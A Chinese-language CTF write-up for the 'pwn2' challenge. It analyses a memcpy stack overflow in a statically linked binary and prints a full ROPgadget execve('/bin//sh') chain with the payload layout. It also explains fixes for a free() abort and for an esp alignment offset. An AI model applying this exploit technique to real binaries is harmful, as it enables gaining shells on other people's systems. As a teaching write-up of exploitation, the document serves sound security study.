## pwn2 (pwn, 350p)

提供了以下文件：  
[pwn2](./pwn2)

---------------------------------------

### 0x1 分析程序
执行下程序，再用IDA分析下，发现有个`memcpy`溢出漏洞，如果一开始的输入的calculate次数过多，再选择`5 Save the result`将导致程序溢出。查看下需要多少个字节才能溢出，在IDA的伪代码中,可以看到`memcpy`是copy到`&v5`指向的地址里。

```
      case 5:
        memcpy(&v5, v7, 4 * v6);
        free(v7);
        return 0;
```

查看下`v5`在栈中的地址偏移情况：

```
-00000034 v5              dd ?
-00000030 var_30          dd ?
-0000002C var_2C          dd ?
-00000028 var_28          dd ?
-00000024 var_24          dd ?
-00000020 var_20          dd ?
-0000001C var_1C          dd ?
-00000018 var_18          dd ?
-00000014 var_14          dd ?
-00000010 var_10          dd ?
-0000000C v6              dd ?
-00000008 v7              dd ?
-00000004 v8              dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)			  ; return address
+00000008 argc            dd ?
+0000000C argv            dd ?                    ; offset
+00000010 envp            dd ?                    ; offset
+00000014
+00000014 ; end of stack variables
```
可以看到56（0x34+4）个字节后将溢出覆盖返回地址。

### 0x2 构造exp
发现程序里没有`system`或`execv`等函数, 但这个程序貌似是静态链接编译的,指令应该比较丰富,用ROPgadget尝试生成ropchain。

```
$ ROPgadget --binary pwn2 --ropchain
	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806ed0a) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080bb406) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ed0a) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080bb406) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ed0a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054730) # xor eax, eax ; ret
	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x0806ed31) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x080ea060) # padding without overwrite ebx
	p += pack('<I', 0x0806ed0a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054730) # xor eax, eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x0807b75f) # inc eax ; ret
	p += pack('<I', 0x08049781) # int 0x80
```

good，有了ropchain，那就容易了。到这里我们构造出的payload大概如下：
```
payload = 'A'*56 + ropchain
```

但测试后发现不行，运行后报abort，也生成了core文件。用`gdb pwn2 core`查看出错原因，发现是`free`函数报错了。原来`memcpy`后就执行`free(v7)`, 而`v7`保存的是之前`malloc	`的地址。由于溢出也把`v7`的值也覆盖了，所以导致`free`报abort。这时队友esrever10说试试`free(0)`,果然是可以的，大赞^_^！  

`free`问题解决了，但又遇到新问题，在执行`mov dword ptr [edx], eax`时报错，报写入地址不正确，调试后发现`edx`这时的值为0，这不科学，明明上面给`edx`赋值了。找了好久也没找到原因，最后灵机一动，把给`edx`赋值的语句多copy一次。nice，终于搞定了。全部代码请看[exp.py](./exp.py)


### 0x3 后续
esrever10看了这题后发现之前写入地址不对应该是`and     esp, 0FFFFFFF0h`导致，
```
.text:08048E24 55                          push    ebp
.text:08048E25 89 E5                       mov     ebp, esp
.text:08048E27 83 E4 F0                    and     esp, 0FFFFFFF0h
.text:08048E2A 83 EC 50                    sub     esp, 50h
```
分析了下，确实是这样的，对齐esp可能导致esp偏移了4/8/12个字节，由于IDA也不知道运行中的esp的值，所以未能显示出这一情况。对于这种情况，最好的解决方案应该是插入三个指向ret指令的地址，相当于继续往下执行，忽略不稳定因素。
